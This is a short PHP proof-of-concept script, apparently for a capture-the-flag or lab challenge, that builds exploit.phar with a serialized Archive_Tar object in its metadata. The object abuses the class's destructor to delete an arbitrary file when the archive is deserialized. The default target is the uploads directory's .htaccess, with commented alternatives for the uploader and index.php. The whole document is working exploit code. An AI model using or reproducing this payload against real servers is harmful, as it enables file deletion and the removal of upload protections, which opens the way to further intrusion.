<?php

# Make use of the Archive_Tar class in Tar.php
class Archive_Tar {
  public $_temp_tarname;
  function __construct($_temp_tarname) {
    $this->_temp_tarname = $_temp_tarname;
  }
}

###
# __destruct method in Archive_Tar class will delete temp file
###
$delete_target = '/var/www/html/uploads/.htaccess';
# $delete_target = '/var/www/html/uploads/index.php'; # delete the uploader file itself
# $delete_target = '/var/www/html/index.php'; # delete the index file itself

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('whatever', 'whatever');
$phar->setStub('<?php __HALT_COMPILER(); ? >');
$phar->setMetadata(new Archive_Tar($delete_target));
$phar->stopBuffering();
